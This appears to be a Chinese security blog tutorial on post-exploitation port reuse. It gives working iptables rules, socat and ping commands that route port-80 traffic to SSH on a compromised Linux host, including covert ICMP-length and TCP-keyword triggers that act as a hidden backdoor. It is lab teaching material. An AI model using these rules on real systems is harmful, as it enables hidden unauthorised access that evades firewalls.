**目录**

[iptables做端口复用](#t0 "iptables做端口复用")

[方案一：(根据源地址做端口复用)](#t1 "方案一：(根据源地址做端口复用)")

[方案二：(根据源地址源端口做端口复用)](#t2 "方案二：(根据源地址源端口做端口复用)")

[方案三：(利用ICMP协议做遥控开关)](#t3 "方案三：(利用ICMP协议做遥控开关)")

[方案四：(利用TCP协议做遥控开关)](#t4 "方案四：(利用TCP协议做遥控开关)")

* * *

iptables做端口复用
-------------

在做[渗透测试](https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020)的过程中，我们经常会遇到下面这种问题。

目标主机是Linux系统，目标主机防火墙有严格的限制，只允许80端口的流量进入。我们拿到了目标主机的Webshell(root权限)并且拿到了[SSH](https://so.csdn.net/so/search?q=SSH&spm=1001.2101.3001.7020)的账号密码。但是目标主机22端口只对内开放，所以必须得利用80端口做端口复用连接。

现在我们的思路就是利用Linux的[iptables](https://so.csdn.net/so/search?q=iptables&spm=1001.2101.3001.7020)防火墙的nat表的PREROUTING 链做端口复用，因为nat 表的 PREROUTING 链会在路由决策之前被处理。关于iptables：[Linux中的防火墙(Netfilter、Iptables、Firewalld)](https://xie1997.blog.csdn.net/article/details/82662026 "Linux中的防火墙(Netfilter、Iptables、Firewalld)")

![](https://img-blog.csdn.net/20180912185612240?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

**环境拓扑图如下：**

![](https://img-blog.csdnimg.cn/20200503100107718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200503095519669.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方案一：(根据源地址做端口复用)

以下这条命令的作用是将来自192.168.10.13的访问80端口的流量都重定向到22端口。

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --dport 80 -j REDIRECT --to-port 22
```


![](https://img-blog.csdnimg.cn/2020050311413523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

连接目标主机的80端口，会被重定向到22端口

![](https://img-blog.csdnimg.cn/20200503095620127.png)

但是这样做有一个问题就是，我们访问目标主机80端口的流量都会被转给22端口。如果我们不用访问该HTTP服务的话，这是一个好的办法。实战中，我们一般是用VPS连接不用访问HTTP服务，所以在实战中该方法用的比较多。

![](https://img-blog.csdnimg.cn/20200503105150904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方案二：(根据源地址源端口做端口复用)

以下的命令是根据源地址源端口做端口复用，也就是只有来自192.168.10.13主机的33333端口的访问80端口的流量会被转给22端口。

```
iptables -t nat -A PREROUTING -p tcp -s 192.168.10.13 --sport 33333 --dport 80 -j REDIRECT --to-port 22
```


![](https://img-blog.csdnimg.cn/20200503114357831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后我们本机先用socat将本地44444端口的流量以源端口33333访问192.168.10.129的80，然后我们SSH本地的44444端口即可。

```
nohup socat tcp-listen:44444,fork,reuseaddr tcp:192.168.10.129:80,sourceport=33333,reuseaddr &      
ssh -p 44444 root@127.0.0.1
```


![](https://img-blog.csdnimg.cn/20200503113706267.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是这样做有一个问题就是不支持多连接 如果想创建两个 SSH 连接就会出错，因为本地的 33333 端口已经被第一个 SSH 连接占用了。

### 方案三：(利用ICMP协议做遥控开关)

利用 ICMP 做遥控开关。缺点在于如果目标在内网，你是无法直接 ping 到它的。

```
iptables -t nat -N LETMEIN             #创建端口复用链      
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22   #创建端口复用规则，将流量转发至 22 端口      
iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1139 -m recent --set --name letmein --rsource -j ACCEPT  #开启开关，如果接收到一个长为 1139 的 ICMP 包，则将来源 IP 添加到加为letmein的列表中      
iptables -t nat -A PREROUTING -p icmp --icmp-type 8 -m length --length 1140 -m recent --name letmein --remove -j ACCEPT          #关闭开关，如果接收到一个长为 1140 的 ICMP 包，则将来源 IP 从 letmein 列表中去掉      
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN    #如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
```


![](https://img-blog.csdnimg.cn/20200503110912616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
开启复用      
ping -c 1 -s 1111 192.168.10.129        #向目标发送一个长度为 1111 的 ICMP 数据包（加上包头28，总长度实际为1139）       
关闭复用      
ping -c 1 -s 1112 192.168.10.129        #向目标发送一个长度为 1112 的 ICMP 数据包（加上包头 28，总长度实际为 1140）
```


![](https://img-blog.csdnimg.cn/20200503111104838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 方案四：(利用TCP协议做遥控开关)

利用 tcp 数据包中的关键字做遥控开关，不怕目标在内网。

```
iptables -t nat -N LETMEIN       #创建端口复用链      
iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22  #创建端口复用规则，将流量转发至 22 端口      
iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT   #开启开关，如果接收到一个含有threathuntercoming的TCP包，则将来源 IP 添加到加为letmein的列表中      
iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT      #关闭开关，如果接收到一个含有threathunterleaving的TCP包，则将来源 IP 从letmein的列表中移除      
iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN    #如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
```


![](https://img-blog.csdnimg.cn/20200503113018237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
开启复用，开启后本机到目标 80 端口的流量将转发至目标的 SSH      
echo threathuntercoming | socat - tcp:192.168.10.129:80       
关闭复用，关闭后，80 恢复正常：      
echo threathunterleaving | socat - tcp:192.168.10.129:80
```


![](https://img-blog.csdnimg.cn/20200503112935839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[远程遥控 IPTables 进行端口复用](https://blog.csdn.net/weixin_43639741/article/details/89363461 "远程遥控 IPTables 进行端口复用")

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10997 人正在系统学习中